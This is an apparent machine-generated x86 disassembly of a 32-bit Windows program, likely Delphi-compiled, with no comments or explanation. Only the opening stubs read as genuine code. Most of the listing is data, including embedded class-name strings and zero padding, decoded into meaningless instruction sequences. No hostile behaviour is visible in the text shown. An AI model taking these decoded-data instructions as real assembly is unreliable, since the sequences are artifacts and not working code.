add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_411238
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_411224
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_411278
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4112b0
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4112ec
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4056dc
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_411360
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4113a6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113ad
retn
mov eax rw-data
call sub_403fa8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a30
sub_4113b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4113dd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113e4
retn
sub_4113f1
adc eax [ ecx ]
add ecx [ edx ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
adc eax [ ecx ]
or eax 0x654c6174
je r-xdata
jae r-xdata
jne r-xdata
retn
inc eax
add [ eax + 0x14 ] ch
inc ecx
add [ ebx ] al
or [ edx + eax * 2 + 0x69 ] edx
inc esp
imul ecx [ ebp + 0x6f ] 0x16564
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + edx + 0x41 ] ah
imul esp [ edi + 0x68 ] 0x64620d74
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ esi ] al
outsd
push edx
sbb [ edx + 0x64 ] ah
push edx
bound esp [ edx + edx * 2 + 0x69 ]
push 0x4c6f5474
je r-xdata
dec esp
je r-xdata
jns r-xdata
add [ ebx ] al
or [ eax + ecx * 2 + 0x65 ] edx
insb
jo r-xdata
push ebx
push 0x5746669
jae r-xdata
insb
or [ gs : ebx + 0x73 ] dh
popad
imul ebp [ fs : esi + 0x67 ] 0x796c6e4f
pop es
jae r-xdata
imul esp [ edi + 0x68 ] 0x4c6f5474
outsd
or [ ecx + 0x43 ] dh
je r-xdata
outsb
je r-xdata
jns r-xdata
push esp
inc ecx
insb
je r-xdata
outsd
insb
pop es
inc ebx
insb
popad
jae r-xdata
add [ ecx ] al
or al 0x54
jae r-xdata
dec eax
insb
jo r-xdata
mov eax eax
inc esp
adc eax 0xc010041
push esp
je r-xdata
je r-xdata
outsd
dec esp
jb r-xdata
add [ 0x654c6462 ] cl
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x73754a74
je r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ gs : eax ] eax
push es
jae r-xdata
jae r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x74 ] ebp
inc ebx
outsd
outsb
add [ ecx ] ecx
jae r-xdata
popad
jae r-xdata
outsd
outsb
je r-xdata
jae r-xdata
add [ eax ] al
add ah dl
adc al 0x41
add [ edi ] al
jae r-xdata
rcr al 0x14
inc ecx
add [ ecx ] al
add [ eax ] al
add [ ebp + edx + 0x41 ] bl
add [ ecx ] cl
push 0x79654b74
ja r-xdata
insb
nop
inc ebx
insb
popad
jae r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
jns r-xdata
add ah dh
adc [ eax ] al
lea eax [ eax ]
and al 0x16
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push ss
inc ecx
add [ eax + eax ] cl
add [ eax ] al
xor al 0x16
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ 0x72434645 ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx ] ah
jb r-xdata
pop esp
adc eax 0x68090041
je r-xdata
dec esp
je r-xdata
add [ eax ] al
inc ebx
js r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add al dh
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + 0x8004115 ] dh
or al 0x54
dec esi
outsd
je r-xdata
sub al 0x15
inc ecx
add [ esi ] al
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
jae r-xdata
je r-xdata
js r-xdata
dec edi
outsb
insb
jns r-xdata
jae r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x174
add [ eax ] al
add [ eax ] eax
add [ eax ] al
inc ecx
insb
imul esp [ edi + 0x6e ] 0x52646218
jae r-xdata
pop es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
inc eax
add [ eax + 0x4116 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004116 ] al
add [ eax ] al
add al bl
adc eax 0x34a00041
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
jb r-xdata
jns r-xdata
inc esp
outsd
jne r-xdata
or [ ebx + 0x73 ] dh
jae r-xdata
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
pop es
inc ebx
insb
dec eax
jns r-xdata
jae r-xdata
je r-xdata
outsd
dec esp
or edx [ ebx + edx * 2 + 0x68 ]
imul esp [ esi + 0x74 ] 0x74617453
add esp edx
adc al 0x41
add [ ebx + 0x411544c0 ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
adc eax 0x9010041
jb r-xdata
add al 0x1
add [ eax ] al
cmp bh 0xff
add [ ebx ] al
add ch [ esi ]
xor [ ecx ] eax
add [ eax ] al
add [ eax ] al
push es
mov eax eax
fcom [ ecx + eax * 2 ]
inc ebx
insb
popad
jae r-xdata
pop eax
inc edi
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_4113e4
retn
inc eax
adc al 0x41
add [ ebx ] al
or dl [ esp + ecx * 2 + 0x65 ]
je r-xdata
or eax 0x69526462
push 0x4c6f5474
outsb
je r-xdata
inc ebx
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
xor al [ eax ]
dec eax
xor al [ eax ]
or eax [ ebp + 0x46 ]
pop ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
pop ss
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
xor al 0x16
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
inc esi
dec edi
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
and al 0x16
dec ebx
dec ebp
imul esp [ esp + 0x6c ] 0x73730865
push edx
imul esp [ edi + 0x68 ] 0x73730874
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
inc ebp
jb r-xdata
popad
add [ eax - 0x5fffbf91 ] cl
jbe r-xdata
je r-xdata
push 0x6e6f4374
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0xc0041 ] bl
outsd
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
sar [ edi + edx ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
outsb
inc ebp
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x65727453 ] cl
popad
inc eax
add al ah
push ss
inc ecx
add [ eax ] al
add [ eax ] al
xor al [ eax ]
or al 0x45
push ebx
je r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
inc esi
[ eax ] eax
inc esp
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sbb [ ecx ] al
or al 0x0
add [ eax ] al
dec eax
pop ss
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
pop ss
inc ecx
add [ eax + eax ] cl
add [ eax ] al
dec eax
pop ss
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
lodsb [ esi ]
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
popad
je r-xdata
xor al [ eax ]
or eax 0x72434645
add [ eax ] al
fcom [ 0x34a00041 ]
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
pop ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx + 0xc0041 ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add al dh
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
nop
clc
sbb [ ecx ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
sbb [ ecx ] eax
or al 0x0
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
lea eax [ eax ]
push esp
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx ] bl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sbb al [ ecx ]
adc [ eax ] al
add [ eax ] al
dec esp
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
sbb [ ecx ] al
or al 0x0
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
outsd
jb r-xdata
add [ esi + edi ] bl
inc ecx
add [ eax + 0x500413e ] bl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x1be0c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sbb eax [ ecx ]
and al 0x0
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x1b7cc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
add al 0x1a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ edx + esi ] cl
inc eax
add [ edx + ebx + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
push edx
popad
inc ebp
jb r-xdata
add [ eax ] al
dec eax
pop ss
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
sbb [ ecx ] al
or al 0x0
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + eax * 2 + 0x540b0041 ] ch
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ecx + eax * 2 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] ah
inc ebx
inc ecx
add [ 0x74694254 ] al
jae r-xdata
ror [ esp + ebx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x411c ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x59ffbee4 ] bl
sbb al 0x41
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add ah dl
inc esp
inc ecx
add ah ah
inc ebp
inc ecx
add ah ch
inc ebp
inc ecx
add [ eax ] al
inc ebp
inc ecx
add [ edx ] al
add bh bh
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al cl
cmp eax 0x3f6c0041
inc ecx
add [ ecx + eax * 2 + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ds
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
jne r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx + 0x100041 ] cl
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
arpl [ ebp + 0x73 ] sp
sbb al 0x1b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
test [ eax + 0x32480040 ] bh
inc eax
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x1b
outsd
jb r-xdata
add [ eax ] al
add [ edx + ebx + 0x41 ] ah
add [ eax + eax ] cl
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
sbb al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ edx ] 0x41
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 + 0x40 ] cl
sub_411f2c
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
sbb al 0x4a
outsb
dec ecx
je r-xdata
add [ edx + esi ] cl
imul ebp [ esi + 0x67 ] 0x7473694c
inc eax
and [ ecx ] al
pop es
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ ecx + ecx * 2 ] dl
inc ecx
add al dh
push edi
inc ecx
add [ eax + ebx * 2 ] ah
inc ecx
add [ eax ] ch
pop eax
inc ecx
add [ eax + ebx * 2 ] ch
inc ecx
add [ eax ] al
dec ebp
inc ecx
add [ eax - 0x3ffbea7 ] ah
pop ecx
inc ecx
add al dl
pop edx
inc ecx
add al al
push ebx
inc ecx
add [ ebx + ebx * 2 ] cl
inc ecx
add [ eax - 0x5bffbea5 ] al
push ebp
inc ecx
add [ eax + 0x5c004155 ] dh
dec eax
inc ecx
add [ esi + edx * 2 + 0x41 ] cl
add [ esi + edx * 2 + 0x56f80041 ] cl
inc ecx
add [ esp + ecx * 2 + 0x58880041 ] ch
inc ecx
add [ esi + ecx * 2 + 0x4f880041 ] dh
inc ecx
add ah al
pop eax
inc ecx
add ah dl
pop eax
inc ecx
add ah ch
dec edi
inc ecx
add [ eax + 0x50 ] al
inc ecx
add ah ch
push eax
inc ecx
add [ edx + edx * 2 + 0x52dc0041 ] al
inc ecx
add [ eax + 0x53 ] dh
inc ecx
add [ esi + edx * 2 ] dl
inc ecx
add [ eax ] dh
push esi
inc ecx
add [ eax ] ch
pop ecx
inc ecx
add [ eax + 0x57 ] bh
inc ecx
add [ eax ] bh
pop ebx
inc ecx
add [ eax + 0x5b ] cl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
dec edx
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
cwde
pop ds
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
and [ ecx ] al
xor [ eax ] al
add [ eax ] al
sbb al 0x1e
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x55 ] cl
inc ecx
add ah ah
inc ebp
inc ecx
add [ edx + ecx * 2 ] bl
add al dl
pop ebx
inc ecx
add [ eax ] dl
inc ecx
add [ eax ] ch
pushad
inc ecx
add al cl
pop edi
inc ecx
add al bl
pop edi
inc ecx
popad
add [ esp + ebx * 2 ] bl
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add ah dl
pop esp
inc ecx
add [ eax + 0x5d ] bl
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
rcr [ ebx + 0x41 ] 0x1
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add al 0x1f
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
mov esp 0x4121
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
and [ ecx ] eax
or [ eax ] al
add [ eax ] al
clc
and [ ecx ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add al ch
popad
inc ecx
add al dl
pop ebx
inc ecx
add [ eax ] dl
inc ecx
add [ eax ] ch
pushad
inc ecx
add al cl
pop edi
inc ecx
add al bl
pop edi
inc ecx
add ah dl
pop esp
inc ecx
add al ch
pop edi
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
add ah dl
pop esp
inc ecx
add al ch
pop edi
inc ecx
add [ 0x6e614854 ] cl
enter 0x415f 0x0
fcomp [ edi + 0x41 ]
popad
insd
mov al 0x20
inc ecx
add ah dh
adc [ eax ] al
add [ eax ] al
pop es
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
xor [ edx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
